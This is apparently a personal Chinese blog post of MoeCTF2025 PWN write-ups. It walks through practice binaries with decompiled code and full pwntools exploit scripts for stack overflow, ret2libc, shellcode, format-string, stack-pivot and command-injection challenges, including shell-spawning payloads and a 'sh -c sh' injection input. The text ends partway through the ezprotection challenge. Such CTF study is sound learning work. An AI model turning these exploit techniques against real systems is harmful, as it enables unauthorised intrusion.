---
title: MoeCTF2025PWN笔记
description: "MoeCTF2025PWN个人向学习笔记"
date: "2026-01-26 12:00:00"
draft: false
sticky: false
showHeroImage: false
tags: [PWN, WP]
categories: [WP]
series: []
comments: true
sidebar:
  enable: true
  toc: true
  relatedPosts: true
---

# MoeCTF2025PWN笔记

> 

复现地址在[这里](https://ctf.xidian.edu.cn/training/22) 

## 0 二进制漏洞审计入门指北

阅读入门指北，开启你的学习吧！

### 文件保护

一般来说，获取一个附件后，我们会首先检查这个文件的保护 `checksec ./pwn` 

| 属性       | 值               |
| -------- | --------------- |
| Arch     | amd64-64-little |
| RELRO    | Full RELRO      |
| Stack    | Canary found    |
| NX       | NX enabled      |
| PIE      | PIE enabled     |
| SHSTK    | Enabled         |
| IBT      | Enabled         |
| Stripped | No              |

当然了这里的你并不会被文件保护拦住，后面遇到再介绍。

### 逆向分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-74h] BYREF
  _BYTE buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+78h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  puts("Guess who am i!");
  print_desc();
  puts("Before u answer me,solve some bypass function!");
  puts("First,you need to tell me the password.");
  __isoc99_scanf("%d", &v4);
  if ( v4 != passwd )
  {
    puts("Maybe you should recall what the password is!");
    exit(1);
  }
  puts("Right!Then,give the answer.");
  read(0, buf, 0x64u);
  if ( !(unsigned int)bypass(buf) )
  {
    puts("You are right!Now i give u what u want!");
    backdoor();
  }
  return 0;
}
```

在程序的 `main()` 函数中，会读取 `v4` 并将其与 `passwd` 比较，不相等则退出进程；同时还需要使 `bypass(buf)` 的值为 0 才能进入后门函数 `backdoor()` 

```c
unsigned __int64 backdoor()
{
  FILE *stream; // [rsp+0h] [rbp-80h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stream = fopen("/flag", "r");
  if ( !stream )
    perror("[-] fopen failed");
  if ( !fgets(s, 100, stream) )
  {
    perror("[-] fgets failed");
    fclose(stream);
  }
  puts(s);
  fclose(stream);
  return v3 - __readfsqword(0x28u);
}
```

可以看到 `backdoor()` 中打印了 flag

在 IDA 中双击 `passwd` 即可看到 `.data` 段上的全局变量 `passwd` 的值是十六进制数 `0x1BF4F` ，也就是 114511，所以第一次输入 114511 通过第一个检查。第二个检查要麻烦一些

```c
__int64 __fastcall bypass(__int64 a1)
{
  if ( !a1 )
    return 0;
  if ( *(_DWORD *)a1 == -559038737 && !strcmp((const char *)(a1 + 4), "shuijiangui") )
    return 0;
  puts("Something wrong.");
  return 1;
}
```

在 `main()` 中变量 `buf` 的类型是 `_BYTE buf` 这在逆向得到的伪代码中经常见到，可以看到一个是占一个字节大小，然而在 `bypass()` 中将它作为了一个 `__int64` 类型的整数，这涉及到数据在内存中的储存，这里不展开讲，`-559038737` 是一个很奇怪的数字，但是可以在 IDA 中右键它看到十六进制是 `0xDEADBEEF` 这会是一个常见的数字，同时这个判断的第二个条件是 a1 也就是 buf 的第五个字节开始是 `"shuijiangui"` ，所以构造符合这两个条件的 payload ，下面是 exp

### EXP

```python
from pwn import *                                    # 导入 pwntools。
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。

# 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。

# io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect(???, ???)              # 与在线环境交互。
io.sendline(b'114511')              # 什么时候用 send 什么时候用 sendline？

payload  = p32(0xdeadbeef)          # p32(0xdeadbeef)、b"\xde\xad\xbe\xef"、b"deadbeef" 有什么区别？
                                    # 你看懂原程序这里的检查逻辑了吗？
payload += b'shuijiangui'           # strcmp

io.sendafter(b'password.', payload) # 发送！通过所有的检查。

io.interactive()                    # 手动接收 flag。
```



## **1 ez_u64**

与上题同样的文件保护，这一次也用不到

### 逆向分析

```c
unsigned __int64 vuln()
{
  __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Ya hello! Let's play a game.");
  printf("Guess which number I'm thinking of.");
  printf("Here is the hint.");
  write(1, &num, 8u);
  printf("\n>");
  __isoc99_scanf("%zu", &v1);
  if ( v1 != num )
  {
    puts("Wrong answer!");
    puts("Try pwntools u64?");
    exit(1);
  }
  puts("Win!");
  system("/bin/sh");
  return v2 - __readfsqword(0x28u);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}
```

可以在 `.bss` 上找到全局变量 `num`  运行程序试看看，程序输出了乱码，这是由于 `write` 直接打印了二进制数据。使用 pwntools 的 `u64()` 可以解码，`p64()`可以编码，`p64() p32() p16() p8()` 分别对应 8字节 4字节 2字节 1字节的大小，这里是 8 个字符也就是8字节，所以使用 u64 解码得到 num ，再向程序发送 num 即可执行 `system("/bin/sh")` 

对于许多 PWN 题，都需要通过执行 `system("/bin/sh")` 来实现 get shell 这样就可以对远程靶机进行操作了，比如 `cat flag`

### EXP

```python
from pwn import*

context(arch = 'amd64',log_level = 'debug',os='linux')

io=remote("127.0.0.1",56269)
# io=process('./pwn')

io.recvuntil("hint.")
num=u64(io.recv(8))
io.sendline(str(num).encode())

io.interactive()
```

## 1 find it

> 初始fd：0，1，2分配给了stdin,stdout,stderr。新的stdout从3开始分配。open flag后，由于关闭了1，flag会被分配到1。依次输入3,./flag,1即可。

 

## 2 EZtext

### 文件保护

| 属性     | 值                |
| -------- | ----------------- |
| Arch     | amd64-64-little   |
| RELRO    | Partial RELRO     |
| Stack    | No canary found   |
| NX       | NX enabled        |
| PIE      | No PIE (0x400000) |
| Stripped | No                |

### 逆向分析

```c
int treasure()
{
  puts("Congratulations! You got the secret!");
  return system("/bin/sh");
}
int __fastcall overflow(int a1)
{
  _BYTE buf[8]; // [rsp+18h] [rbp-8h] BYREF

  if ( a1 <= 7 )
    return puts("Come on, you can't even fill up this array?");
  read(0, buf, a1);
  return puts("OK,I receive your byte.and then?");
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  puts("Stack overflow is a powerful art!");
  puts("In this MoeCTF,I will show you the charm of PWN!");
  puts("You need to understand the structure of the stack first.");
  puts("Then how many bytes do you need to overflow the stack?");
  __isoc99_scanf("%d", &v4);
  overflow(v4);
  return 0;
}
```

这是一个栈溢出漏洞，如文件中打印的：首先你需要理解栈的结构（自行理解），以及需要多少字节才能溢出

在 `overflow()` 中，要求我们输入的数字大于7，因为在 `overflow()` 中的 `buf[]` 的大小是 8 字节。首先填满 `buf[]` 再覆盖 RBP ，再将 `treasure()` 的地址填入

### EXP

```c
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

io = remote('127.0.0.1', 52431)
# io = process('./pwn')
io.sendline(b'40')

payload = b'a'*16+ p64(0x4011BE)	# 16字节覆盖了 buf 和 rbp
# 原本栈上 rbp 后是该函数的返回地址，现在将其修改为了 0x4011BE，程序流便被我们劫持到 0x4011BE执行
io.sendline(payload)
io.interactive()
```

## 2 ezshellcode

### 逆向

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-20h] BYREF
  int prot; // [rsp+4h] [rbp-1Ch]
  int v6; // [rsp+8h] [rbp-18h]
  int v7; // [rsp+Ch] [rbp-14h]
  void *s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v9; // [rsp+18h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  init(argc, argv, envp);
  s = mmap(0, 0x1000u, 3, 34, -1, 0);
  if ( s == (void *)-1LL )
  {
    perror("mmap");
    return 1;
  }
  memset(s, 0, 0x1000u);
  v6 = 0;
  prot = 0;
  puts("In a ret2text exploit, we can use code in the .text segment.");
  puts("But now, there is no 'system' function available there.");
  puts("How can you get the flag now? Perhaps you should use shellcode.");
  puts("But what is shellcode? What can you do with it? And how can you use it?");
  puts("I will give you some choices. Choose wisely!");
  __isoc99_scanf("%d", &v4);
  do
    v7 = getchar();
  while ( v7 != 10 && v7 != -1 );
  if ( v4 == 4 )
  {
    if ( v6 == 1 )
      puts("You can only make one change!");
    prot = 7;
    v6 = 1;
  }
  else
  {
    if ( v4 > 4 )
      goto LABEL_24;
    switch ( v4 )
    {
      case 3:
        if ( v6 == 1 )
          puts("You can only make one change!");
        prot = 4;
        v6 = 1;
        break;
      case 1:
        if ( v6 == 1 )
          puts("You can only make one change!");
        prot = 1;
        v6 = 1;
        break;
      case 2:
        if ( v6 == 1 )
          puts("You can only make one change!");
        prot = 3;
        v6 = 1;
        break;
      default:
LABEL_24:
        puts("Invalid choice. The space remains in its chaotic state.");
        exit(1);
    }
  }
  if ( mprotect(s, 0x1000u, prot) == -1 )
  {
    perror("mprotect");
    exit(1);
  }
  puts("\nYou have now changed the permissions of the shellcode area.");
  puts("If you can't input your shellcode, think about the permissions you just set.");
  read(0, s, 0x1000u);
  ((void (*)(void))s)();
  return 0;
}
```

**在Linux中，`mprotect` 函数的功能是用来设置一块内存的权限**

第三个参数 prot 代表内存块所拥有的权限：

-   无法访问 即PROT_NONE：不允许访问，值为 0
-   可读权限 即PROT_READ：可读，值加 1
-   可写权限 即PROT_WRITE：可读， 值加 2
-   可执行权限 即PROT_EXEC：可执行，值加 4

 `.text` 段就是可执行的，在 IDA 中可以可看到 `.text` 段的汇编代码，程序运行时执行这些机器指令。如果一块内存同样是可执行的，且有写的条件时，可以向其中注入一段机器码，再控制程序执行这段代码。这样的机器码被叫做 shellcode 

在编写 shellcode 时，一般会使用到系统调用，一段 shellcode 如下

```asm
mov rbx, 0x68732f6e69622f ;
push rbx;
mov rdi, rsp;

xor rsi,rsi;
xor rdx,rdx;
mov rax,0x3b;
syscall;
```

这段 shellcode 展示了一个 执行 `execve("/bin/sh")` 的过程，或者说是 `system("/bin/sh")` ，在 x64 下，前六个参数依次通过 `rdi` `rsi` `rdx` `rcx(r10)` `r8` `r9` 传递 ，`0x3b` 即 59 是 `execve` 的系统调用号，关于系统调用可以看[这里](https://syscall.sh/) ，`0x68732f6e69622f` 就是 `/bin/sh` 字符串的 ASCII 码，注意是小端序。将 `/bin/sh` 字符串放进 `rbx` ，压入栈顶寄存器 `rsp` ，再将 `rsp` 放入 `rdi` 作为第一个参数，（一般来说将字符串指针作为参数而不是字符串本身）`xor rsi rsi` 是将 `rsi` 的置零。`rax` 的值决定了系统调用。

### EXP

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

# io = remote('host', port)
io = process('./pwn')

io.sendline(b'4')

shellcode="""
mov rbx, 0x68732f6e69622f ;
push rbx;
mov rdi, rsp;

xor rsi,rsi;
xor rdx,rdx;
mov rax,0x3b;
syscall;
"""

shellcode=asm(shellcode)
io.sendafter("set.",shellcode)

io.interactive()
```

## 3 认识libc

> 什么是 libc ? C语言是怎么实现的？程序也没有用到类似 system 的函数，那么你将如何 getshell 呢？
>
> **libc（C Standard Library）是 C 语言最基础的函数库** ，libc 是我们操作系统的基础部件，基本上所有的程序都依赖它。在不同的操作系统中，libc 的具体实现可能不同，其中在 Linux 上最广泛使用的实现是 `GNU C Library`，也就是我们常说的 `glibc` 

### 文件保护

| 属性     | 值                |
| -------- | ----------------- |
| Arch     | amd64-64-little   |
| RELRO    | Partial RELRO     |
| Stack    | No canary found   |
| NX       | NX enabled        |
| PIE      | No PIE (0x3fe000) |
| Stripped | No                |

### 逆向分析

```c
ssize_t vuln()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("\nNow, show me what you can do with this knowledge:");
  printf("> ");
  return read(0, buf, 0x100u);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  puts("The Oracle speaks...");
  puts("There is no system function in the .text segment.");
  printf("A gift of forbidden knowledge, the location of 'printf': %p\n", &printf);
  vuln();
  return 0;
}
```

在这个简单的程序中虽然有栈溢出，但是在整个程序中并没有发现 `system()` 函数。

这里务必去了解一下 libc 。每个 c 编写的程序都离不开 libc 。在使用 `printf()` 时我们会在头文件里写 `#include <stdio.h>` 但实际上并不会把 `printf()` 的定义也一起编译，程序运行时会依赖库文件，当需要用到 `printf()` 时会调用库文件中的函数，这涉及了 **动态链接** 和 **延迟绑定**

相关文章：

- [**Pwn**基础：PLT&GOT表以及**延迟绑定**机制-腾讯云开发者社区 ...](https://cloud.tencent.com/developer/article/1590167) 
- [**PWN**从入门到放弃 (7)——栈溢出之ret2libc-腾讯云开发者社区 ...](https://cloud.tencent.com/developer/article/2384856) 

你还需要学习使用 `patchelf` ，来更改程序运行时依赖的库和 linker ，如何 `patch` ?

攻击思路是先泄露函数的地址，比如使用 `puts` 等函数，再计算 libc 的偏移和所需函数的偏移。

gdb 是调试的好工具， pwndbg 是 gdb 的一个增强插件，为 pwn 带来了强大的调试能力。

在这里，程序直接打印了 `printf` 函数的真实地址，可以看到每次都不一样（ 但都是像 `0x7f` 这样开头的，在 gdb 中输入 `libc` 即可查看当前 libc 的偏移 ) ，根据函数真实地址计算出 libc 的偏移，进而计算出 `pop rdi` 等 gadget 、`system()` 和 `/bin/sh` 字符串的偏移。学习一下如何写 **ROP** ，注意 **栈对齐** 

### EXP

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

libc = ELF("./libc.so.6")

io = remote('127.0.0.1', 59319)
# io = process('./pwn')

io.recvuntil(": 0x")
printf_addr = int(io.recv(12),16)
libc.address = printf_addr - libc.symbols["printf"]

log.success(f"printf -> {hex(printf_addr)}")
log.success(f"libc -> {hex(libc.address)}")
system = libc.symbols["system"]

pop_rdi =libc.address + 0x2a3e5
ret = libc.address + 0x29139
bin_sh =next(libc.search(b'/bin/sh'))

payload = b'a'*72+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)
# 覆盖 buf 和 rbp ，第一个参数设为 "/bin/sh 的地址，栈对齐，调用 system() "
io.sendafter(">",payload)
io.interactive()

```

## boom

### 文件保护

| 属性     | 值                |
| -------- | ----------------- |
| Arch     | amd64-64-little   |
| RELRO    | Partial RELRO     |
| Stack    | No canary found   |
| NX       | NX enabled        |
| PIE      | No PIE (0x400000) |
| Stripped | No                |

### 逆向分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[124]; // [rsp+0h] [rbp-90h] BYREF
  int v5; // [rsp+7Ch] [rbp-14h]
  int v6; // [rsp+8Ch] [rbp-4h]

  init(argc, argv, envp);
  puts("Welcome to Secret Message Book!");
  puts("Do you want to brute-force this system? (y/n)");
  fgets(&brute_choice, 8, stdin);
  v6 = 0;
  if ( brute_choice == 121 || brute_choice == 89 )
  {
    v6 = 1;
    canary = (int)random() % 114514;
    v5 = canary;
    puts("waiting...");
    sleep(1u);
    puts("boom!");
    puts("Brute-force mode enabled! Security on.");
  }
  else
  {
    puts("Normal mode. No overflow allowed.");
  }
  printf("Enter your message: ");
  if ( v6 )
    gets(s);
  else
    fgets(s, 128, stdin);
  if ( v6 && v5 != canary )
  {
    puts("Security check failed!");
    exit(1);
  }
  puts("Message received.");
  return 0;
}
```

> 你可以轻易爆破我们的系统，但是一个不可泄露的“canary”你又该如何应对？

人工canary，提供了win函数，提示可以使用python的ctypes包
ctypes可以调用C库函数，于是使用ctypes加载libc
init()中有`v0 = time(0LL)`，使time=0，

```c
char s[124]; // [rsp+0h] [rbp-90h] BYREF
int v5; // [rsp+7Ch] [rbp-14h]
int v6; // [rsp+8Ch] [rbp-4h]
```

因为程序会检查 `v5` 的值是否改变，`int` 类型占 4 字节的空间。所以覆盖前 124 后，填上 canary 再继续覆盖至 `rbp` ，再填充后门函数。注意栈对齐。

### EXP

```python
from pwn import *
import ctypes
import time

p = remote('192.168.50.1', 58472)
#p=process('./pwn')
libc = ctypes.CDLL('libc.so.6')
libc.srand(int(time.time()))
canary = libc.rand() % 114514
backdoor = 0x401276
ret = 0x40101a

p.sendlineafter(b'(y/n)', b'y')
payload = b'a' * 124 + p32(canary) + b'a'*24+p64(ret)+ p64(backdoor)

p.sendlineafter(b'Enter your message: ', payload)
p.interactive()
```

## boom_revenge

见 [boom](#boom)

## fmt

### 文件保护

| 属性     | 值              |
| -------- | --------------- |
| Arch     | amd64-64-little |
| RELRO    | Full RELRO      |
| Stack    | Canary found    |
| NX       | NX enabled      |
| PIE      | PIE enabled     |
| SHSTK    | Enabled         |
| IBT      | Enabled         |
| Stripped | No              |

### 逆向分析

```c
int win()
{
  puts("You got it!");
  return system("/bin/sh");
}

unsigned __int64 __fastcall generate(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 i; // [rsp+18h] [rbp-48h]
  char v4[56]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  strcpy(v4, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(a1 + i) = v4[(int)arc4random_uniform(52)];
  *(_BYTE *)(a1 + a2) = 0;
  return v5 - __readfsqword(0x28u);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v4; // [rsp+8h] [rbp-88h]
  char s1[16]; // [rsp+10h] [rbp-80h] BYREF
  char s2[16]; // [rsp+20h] [rbp-70h] BYREF
  char s[88]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v8; // [rsp+88h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v4 = (char *)malloc(0x20u);
  generate(s2, 5);
  generate(v4, 5);
  puts("Hey there, little one, what's your name?");
  fgets(s, 80, stdin);
  printf("Nice to meet you,");
  printf(s);
  puts("I buried two treasures on the stack.Can you find them?");
  fgets(s1, 8, stdin);
  if ( strncmp(s1, s2, 5u) )
    lose();
  puts("Yeah,another one?");
  fgets(s1, 8, stdin);
  if ( strncmp(s1, v4, 5u) )
    lose();
  win();
  return 0;
}
```

程序声称在栈上留了两个宝藏，会是什么呢。注意调用了两次 `generate` 。启动 gdb 调试。看到

```
pwndbg> stack
00:0000│ rsp 0x7fffffffdbf0 ◂— 0xc000
01:0008│-088 0x7fffffffdbf8 —▸ 0x55555555b2a0 ◂— 0x566e4e587a /* 'zXNnV' */
02:0010│-080 0x7fffffffdc00 ◂— 0x1940000
03:0018│-078 0x7fffffffdc08 ◂— 0x140000
04:0020│-070 0x7fffffffdc10 ◂— 0x486f434a68 /* 'hJCoH' */
05:0028│-068 0x7fffffffdc18 —▸ 0x7fffffffdc48 ◂— 0
06:0030│-060 0x7fffffffdc20 ◂— 0xba00000006
07:0038│-058 0x7fffffffdc28 ◂— 0
```

一个是直接在栈上的数据 `s2[16]`，另一个是在栈上的指针 `v4`。程序的检查逻辑是第一次输入 `s1` 与 `s2` 相等，第二次 `s1` 与 `v4` 相等。

**格式化字符串** 是一种强大的攻击手段。

### EXP

```c
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

io = remote('127.0.0.1', 59353)
# io = process('./pwn')

io.sendline(b'%7$s-%10$p')

io.recvuntil(b'you,')
v4=io.recv(5)
io.recvuntil(b'-0x')
s2 = p64(int(io.recv(10), 16))[:5]

io.sendline(s2)
io.sendline(v4)
io.interactive()

```



## inject

Rust 是一种内存安全的语言。

使用#注释`-c 4`
或第一个sh执行第二个sh `ping sh -c sh -c 4`

```python
from pwn import *
#p=process('./pwn')
p=remote('192.168.50.1', 52971)
p.sendlineafter('Your choice: ',str(4))
#payload = "\nsh -c sh"
#payload="\nsh #"
p.sendafter('Enter host to ping: ',payload)
p.interactive()
```



## randomlock

## str_check

### 逆向分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char dest[24]; // [rsp+0h] [rbp-20h] BYREF
  size_t n; // [rsp+18h] [rbp-8h] BYREF

  init(argc, argv, envp);
  puts("What can u say?");
  __isoc99_scanf("%255s", str);
  puts("So,what size is it?");
  __isoc99_scanf("%zu", &n);
  len = strlen(str);
  if ( (unsigned __int64)len > 0x18 )
  {
    puts("Oh,too much.");
    exit(1);
  }
  if ( !strncmp(str, "meow", 4u) )
    memcpy(dest, str, n);
  else
    strncpy(dest, str, n);
  puts("You're right.");
  return 0;
}
```

使用\x00截断字符串，字符串前4是moew，ret2text
`ljust`原数据靠左 ，`rjust`原数据靠右，都用来填充字节。

### EXP

```python
from pwn import *
context.log_level='debug'
p=remote('192.168.50.1',53500)
#p=process('./pwn')
elf = ELF('./pwn')
backdoor=0x40123b
payload=b'moew\x00'.ljust(0x20+8,b'a')+p64(backdoor)
p.sendlineafter(b'say?',payload)
p.sendlineafter('?',b'200')
p.interactive()
```



## syslock

### 逆向分析

```c
i = input();
if ( i > 4 )
  lose();
write(1, "Input your password\n", 0x14uLL);
read(0, (char *)&s + i, 0xCuLL);
if ( i != 59 )
  lose();
cheat();
```

注意到了main()的逻辑是 `i <= 4&&i == 59`，

在 [ezshellcode](# 2 ezshellcode) 中已经介绍过系统调用。

*59暗示系统调用号*，这里不需要直接覆盖返回地址，而是利用数组下标越界修改全局变量。查看.bss段 `i`的地址是`0x404080``s`的地址是`0x4040a0`差是0x20，也就是&s+-32指向i，修改使其为59。在cheat()中覆盖，注意到还没有读入`/bin/sh`

没有字符串就自己读进去。

因为没有注意到main()中能读12字节，笔者在cheat()中读入`/bin/sh`。

### EXP

```python
from pwn import*
context.arch = 'amd64'
context.log_level = 'debug'
elf = ELF('./pwn')
# p = process('./pwn')
p = remote('192.168.50.1',54928)

pop_rdi_rsi_rdx = 0x401240
pop_rax = 0x401244
syscall = 0x401230
read_plt = 0x4010A0
s_addr = 0x4040A0

p.sendlineafter(b'choose mode\n',b'-32')
p.recvuntil(b'Input your password')
p.send(p64(59))

payload = b'a'*64
payload += b'SNOWCATT'
payload += p64(pop_rdi_rsi_rdx)
payload += p64(0) + p64(s_addr) + p64(8)
payload += p64(read_plt)

payload += p64(pop_rdi_rsi_rdx)
payload += p64(s_addr) + p64(0) + p64(0)
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)
p.recvuntil(b'Developer Mode.\n')
p.send(payload)
sleep(0.1)
p.send(b"/bin/sh\x00")
p.interactive()
```

## xdulaker

### 逆向分析

```c
int photo()
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF
...
  read(0, buf, 0x40uLL);
...
}
ssize_t laker()
{
  char s1[48]; // [rsp+0h] [rbp-30h] BYREF
  if ( memcmp(s1, "xdulaker", 8uLL) )
...
}
```

**PIE** 是常见的文件保护。主要的功能是随机化了ELF装载的**基地址**，使用分页内存偏移定位到每一行指令，常见的表现形式是如果开启了`PIE`保护，使用file命令可以清楚看到

```
pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-linux-x86-64.so.2, BuildID[sha1]=e0643d1860124e563bb8a3c7a40735aed30dad57, for GNU/Linux 3.2.0, not stripped
```

注意到有后门函数。pull()中泄露PIE基址，photo()可以读64个字节，laker()将s1与"xdulaker"比较，相同则通过。

简单验证一下

```
Hey,what's your name?!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxdulaker
I will teach you a lesson.
>3
welcome,xdulaker
```

### EXP

```python
from pwn import*
context.log_level ='debug'
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# p = process('./pwn')
p = remote('192.168.50.1',59868)

p.sendlineafter(b'>',b'1')
p.recvuntil(b'gift:')
leak_opt = int((p.recv(14)),16)
pie_base=leak_opt - 0x4010
bkd=pie_base+0x124E
log.success(hex(pie_base))

p.sendlineafter(b'>',b'2')
payload1 = b'a'*0x20 + b'xdulaker'
p.sendafter(b'your name?!\n',payload1)

p.sendlineafter(b'>',b'3')
p.recvline()
payload2 = b'a'*48 + b'SNOWCATT' + p64(bkd)
p.sendline(payload2)
p.interactive()
```

## eazylibc

### 逆向分析

```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  return read(0, buf, 0x60u);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0);
  printf("What is this?\nHow can I use %p without a backdoor? Damn!\n", &read);
  vuln();
  puts("Something happening");
  return 0;
}
```

开启了PIE，显然可以通过read泄露PIE基址，这里注意一下延迟绑定.还需要泄露libc，于是返回泄露libc。

当采用动态链接以及延迟绑定之后，程序初加载的时候，并不知道诸如read等libc函数的实际加载地址，此时需要通过该机制进行解析之后，才会填入got表。

gdb 是调试的好工具，程序打印时还没有调用过 `read` ，在 gdb 中 

```
pwndbg> tele 0x555555555060
00:0000│     0x555555555060 ◂— endbr64
01:0008│     0x555555555068 ◂— add dl, dh
02:0010│     0x555555555070 (__cxa_finalize@plt) ◂— endbr64
03:0018│     0x555555555078 (__cxa_finalize@plt+8) ◂— 0x441f0f00002f /* '/' */
04:0020│     0x555555555080 (puts@plt) ◂— endbr64
05:0028│     0x555555555088 (puts@plt+8) ◂— 0x441f0f00002f /* '/' */
06:0030│     0x555555555090 (setbuf@plt) ◂— endbr64
07:0038│     0x555555555098 (setbuf@plt+8) ◂— 0x441f0f00002f /* '/' */
```

看到个偏移是是在 `read` 的 `plt` 上方的一点位置，根据它计算出PIE基址来绕过 PIE

现在你掌握ret2libc了。

```python
from pwn import*
context.log_level='debug'
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
p=remote("192.168.50.1",65064)

p.recvuntil("use ")
leak_read=int((p.recv(14)),16)
pie_base=leak_read-0x1060
start=pie_base+0x10c0

payload=b"A"*40+p64(start)
p.send(payload)

p.recvuntil("use ")
leak_read2 = int(p.recv(14),16)
libc_base=leak_read2-libc.symbols['read']
system=libc_base+libc.symbols['system']
bin_sh=libc_base+next(libc.search(b'/bin/sh'))
pop_rdi=libc_base+0x2a3e5
ret=pie_base+0x101a
payload=b"a"*40+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)
p.send(payload)
p.interactive()
```

## ezpivot

### 逆向分析

```c
public magic
magic proc near
; __unwind {
endbr64
push    rbp
mov     rbp, rsp
pop     rdi
retn
magic endp

int __fastcall introduce(unsigned int a1)
{
  read(0, &desc, a1);
  return puts("Ok,we got your introduction!");
}

int backdoor()
{
  return system("echo moectf{WowYouGetTheFlag}");
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  signed int v4; // [rsp+0h] [rbp-10h] BYREF
  _BYTE buf[12]; // [rsp+4h] [rbp-Ch] BYREF

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  puts("Welcome to join this pwn party!");
  puts("Please say something to introduce yourself:");
  puts("Before that,you need to tell us the length of your introduction.");
  __isoc99_scanf("%d", &v4);
  if ( v4 > 32 )
  {
    puts("Your introduction is too long, please try again.");
    exit(1);
  }
  introduce(v4);
  puts("Now, please tell us your phone number:");
  read(0, buf, len_of_phonenum);
  return 0;
}
```

栈迁移的一个方法是两次 `leave; retn` 把提前布置好的 `rop` 链放到后面再执行的操作就叫做栈风水

`mian()`中读取了一个整数 `v4`，注意到 `v4>32` 则退出，`introduce()` 中会向 `.bss`段的 `desc`读`v4` 字节。要把 `.bss` 伪造成一个栈，越大越好。

```asm
lea     rax, [rbp+var_10]
mov     rsi, rax
lea     rax, aD           ; "%d"
mov     rdi, rax
call    ___isoc99_scanf
...
mov     eax, [rbp+var_10]
cmp     eax, 20h          ; 0x20 = 32
jle     short loc_401306  ; 如果 eax <= 32 则跳转
```

这里发现 `read()` 的参数是 `nbytes` 如果是一个负数，那它会被认为是一个巨大的正数。

```asm
push    rbp
mov     rbp, rsp
sub     rsp, 10h
mov     dword ptr [rbp+nbytes], edi
mov     eax, dword ptr [rbp+nbytes]
mov     rdx, rax        ; nbytes
lea     rax, desc
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read
```

`main()` 的末尾

```asm
mov     eax, cs:len_of_phonenum ;
movsxd  rdx, eax                ;nbytes
lea     rax, [rbp+buf]          ;buf
mov     rsi, rax
call    _read
```

`buf`12字节，覆盖`rbp`8字节，剩下8字节正好覆盖返回地址。笔者先用`introduce()`在`.bss`段布置好rop链，再将返回地址覆盖为`leave; retn`。当我们在返回地址处放一个 `leave; ret`，而之前又通过溢出修改了 `rbp` 时，程序会执行第二次 `leave`，这时 `rsp` 就会被强行拉到我们指定的 `.bss` 地址。

### EXP

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux','splitw','-h']

# p = process('./pwn')
p = remote('192.168.50.1',50126)
# gdb.attach(p, 'b *main')

p.sendlineafter(b'of your introduction.',b'-1')
pop_rdi = 0x401219
system = 0x401230
desc = 0x404060
ret = 0x40101a
leave = 0x40120f
payload = b'/bin/sh\x00' + b'\x00'*(0x600-8+0x100)  + p64(0x404600) + p64(0x404600)
payload += p64(pop_rdi) + p64(0x404060) + p64(ret) + p64(system)
p.send(payload)
payload1 = b'a' * 12 + p64(0x404660-8+0x100+0x10) + p64(leave)
p.sendafter(b'lease tell us your phone number:' , payload1)
p.interactive()
```

## ezprotection

### 文件保护

| 属性       | 值               |
| -------- | --------------- |
| Arch     | amd64-64-little |
| RELRO    | Full RELRO      |
| Stack    | Canary found    |
| NX       | NX enabled      |
| PIE      | PIE enabled     |
| SHSTK    | Enabled         |
| IBT      | Enabled         |
| Stripped | No              |

### 逆向分析

```c
void __noreturn backdoor()
{
  _QWORD buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[1] = __readfsqword(0x28u);
  puts("Give me the password!");
